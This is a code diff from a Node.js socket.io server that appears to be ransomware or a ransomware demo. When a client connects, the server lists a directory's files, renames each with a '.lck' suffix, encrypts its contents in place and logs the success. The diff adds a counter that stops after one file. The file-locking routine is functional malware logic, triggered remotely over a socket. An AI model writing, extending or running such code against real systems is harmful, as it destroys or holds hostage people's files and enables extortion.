@@ -127,12 +127,14 @@ io.on('connection', (socket) => {
           if (err) {
               return console.log('Unable to scan directory: ' + err);
           } 
+
+          var filesToEncrypt = 1;
+          var filesEncrypted = 0;
           //listing all files using forEach
-          files.forEach(function (file) {
-              // Do whatever you want to do with the file
+          files.some(function (file) {
               console.log(file); 
 
-              if (file.split('.').pop() == 'lck') return;
+              if (file.split('.').pop() == 'lck') return false;
 
               var currentPath = dir + '/' + file;
               var newPath= dir + '/' + file + '.lck';
@@ -142,12 +144,16 @@ io.on('connection', (socket) => {
               fs.readFile(newPath, function(err, buf) {
                 //console.log(buf.toString());
                 var encrypted = encrypt(buf).toString();
+
                 fs.writeFile(newPath, encrypted, (err) => {
                   if (err) console.log(err);
-                  console.log("Successfully Written to File.");
+                  else {
+                    console.log("Successfully encrypted " + newPath);
+                  }
                 });
               });
 
+              return (++filesEncrypted >= filesToEncrypt);
           });
       });
 
